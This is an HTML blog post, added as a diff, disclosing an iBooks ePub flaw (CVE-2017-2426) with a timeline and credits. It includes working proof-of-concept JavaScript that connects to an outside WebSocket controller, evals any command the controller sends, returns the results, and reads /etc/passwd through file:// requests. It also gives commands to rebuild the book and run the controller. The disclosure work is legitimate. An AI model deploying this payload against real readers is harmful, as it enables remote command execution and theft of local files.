@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>This book reads you - using JavaScript</title>
+  <meta name="description" content="  “Yes, books are dangerous. They should be dangerous - they contain ideas.” - Pete Hautman">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://s1gnalcha0s.github.io/ibooks/epub/2017/03/27/This-book-reads-you-using-JavaScript.html">
+  <link rel="alternate" type="application/rss+xml" title="Signal Chaos" href="http://s1gnalcha0s.github.io/feed.xml" />
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Signal Chaos</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+          <a class="page-link" href="/stuff/">Stuff</a>
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">This book reads you - using JavaScript</h1>
+    <p class="post-meta">Mar 27, 2017</p>
+  </header>
+
+  <article class="post-content">
+    <blockquote>
+  <p>“Yes, books are dangerous. They should be dangerous - they contain ideas.” - Pete Hautman</p>
+</blockquote>
+
+<p>On a previous post about ePub parsers (<a href="/epub/2017/01/25/This-book-reads-you.html">This book reads you - exploiting services and readers that support the ePub book format</a>), I mentioned using scripting capabilities in ePub to perform local attacks against users. </p>
+
+<p>Apple just released a fix for one issue I reported last year in iBooks that allowed access to files on a users system when a book was opened. iBooks on El Capitan would open an ePub using the file:// origin, which would allow an attacker to access the users file system when they opened a book. (<a href="https://support.apple.com/en-us/HT207615">CVE-2017-2426</a>)</p>
+
+<p>To help demonstrate how this could be used to perform attacks against users, I added a WebSocket client to a book, so that all users who open the  book will connect back to a WebSocket controller server that will feed them arbitrary instructions. The WebSocket client in the ePub will allow access as long as the user has the book open (expectation is that it could be open for a long time, if the user is provided with something worth reading).</p>
+
+<p>eg., Sending a book to a user:
+<img src="/assets/ibooks/email.png" alt="Image" /></p>
+
+<p>iBooks connects to the WebSocket Controller when opening the book:
+<img src="/assets/ibooks/ibooks.png" alt="Image" /></p>
+
+<p>iBooks connecting back to a WebSockets Controller. Local files can be retrieved if the reader is vulnerable to CVE-2017-2426 (file:// origin):
+<img src="/assets/ibooks/controller.png" alt="Image" /></p>
+
+<p>Video demo of how this works (trying to type with one hand):</p>
+
+<p><iframe src="https://player.vimeo.com/video/210000247" width="640" height="360" frameborder="0" webkitallowfullscreen="" mozallowfullscreen="" allowfullscreen=""></iframe></p>
+
+<p>This is the POC book if you want to try it yourself. You can open it in a reader like Apple iBooks or Adobe Digital Editions. </p>
+
+<p><a href="/assets/controller/POC.epub"><img src="/assets/ibooks/ibooksico.png" alt="Image" /></a></p>
+
+<p>Disclaimer: The POC connects to my controller, but I promise not to do anything bad. 😉</p>
+
+<h4 id="to-modify-it-to-point-to-your-own-controller">To modify it to point to your own controller:</h4>
+
+<ul>
+  <li>
+    <p><strong>curl https://s1gnalcha0s.github.io/assets/controller/POC.epub -o poc.epub</strong></p>
+  </li>
+  <li>
+    <p><strong>unzip poc.epub; rm poc.epub</strong></p>
+  </li>
+</ul>
+
+<p>eg., contents of poc.epub/EPUB/js/main.js </p>
+
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="nx">WebSocketController</span> <span class="o">=</span> <span class="s1">&#39;ws://websocket-controller.herokuapp.com:80&#39;</span><span class="p">;</span>
+
+<span class="kd">var</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="nx">WebSocketController</span><span class="p">,</span> <span class="s1">&#39;echo-protocol&#39;</span><span class="p">);</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onopen</span><span class="p">()</span> <span class="p">};</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onmessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">};</span>
+<span class="nx">socket</span><span class="p">.</span><span class="nx">onclose</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> <span class="nx">onerror</span><span class="p">()</span> <span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">onopen</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="nx">message</span><span class="p">(</span><span class="s1">&#39;Connected to WebSocket Controller: &#39;</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">onerror</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="nx">message</span><span class="p">(</span><span class="s1">&#39;Unable to connect to WebSocket Controller: &#39;</span> <span class="o">+</span> <span class="nx">WebSocketController</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">onmessage</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="c1">//just eval anything sent from the controller</span>
+  <span class="nx">response</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+
+  <span class="c1">//send response back to controller</span>
+  <span class="nx">socket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">response</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">get</span><span class="p">(</span><span class="nx">loc</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">xmlhttp</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;file://&#39;</span> <span class="o">+</span> <span class="nx">loc</span><span class="p">,</span><span class="kc">false</span><span class="p">);</span>
+  <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+  
+  <span class="c1">//populate the message element</span>
+  <span class="nx">message</span><span class="p">(</span><span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nx">xmlhttp</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">message</span><span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;message&quot;</span><span class="p">).</span><span class="nx">innerText</span> <span class="o">=</span> <span class="nx">message</span><span class="p">;</span>
+  <span class="k">return</span> <span class="nx">message</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">showExfil</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
+<span class="p">}</span></code></pre></div>
+
+<ul>
+  <li><strong>zip -r poc.epub *</strong></li>
+</ul>
+
+<h4 id="nodejs-websocket-controller">Node.js WebSocket Controller:</h4>
+
+<ul>
+  <li>curl https://s1gnalchaos.github.com/assets/controller/server.js -o server.js</li>
+  <li>npm install websocket</li>
+  <li>node server.js</li>
+</ul>
+
+<p>Disclosure timeline stuff:</p>
+
+<ul>
+  <li>Dec 2016: Reported to Apple.</li>
+  <li>Mar 2017: Fix release, and this post.</li>
+</ul>
+
+<p>Shoutouts:</p>
+
+<p><a href="https://twitter.com/shhnjk">@shhnjk</a> reported CVE-2017-2426 as well around the same time 👍. 
+<br /><a href="https://twitter.com/mccabe615">@mccabe615</a> ran a POC to help me confirm some issues independently. </p>
+
+<p>Thanks for reading. 👋 </p>
+
+<p><a href="https://twitter.com/craig_arendt">@craig</a></p>
+
+  </article>
+
+</div>
+<!--
+<div id="disqus_thread"></div>
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 's1gnalcha0s'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments</a></noscript>
+-->
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Signal Chaos</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col  footer-col-1">
+        <ul class="contact-list">
+          <li>Signal Chaos</li>
+          <li><a href="mailto:"></a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col  footer-col-2">
+        <ul class="social-media-list">
+          
+
+          
+          <li>
+            <a href="https://twitter.com/craig_arendt">
+              <span class="icon  icon--twitter">
+                <svg viewBox="0 0 16 16">
+                  <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809
+                  c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
+                </svg>
+              </span>
+
+              <span class="username">craig_arendt</span>
+            </a>
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col  footer-col-3">
+        <p class="text">Observations in application security
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
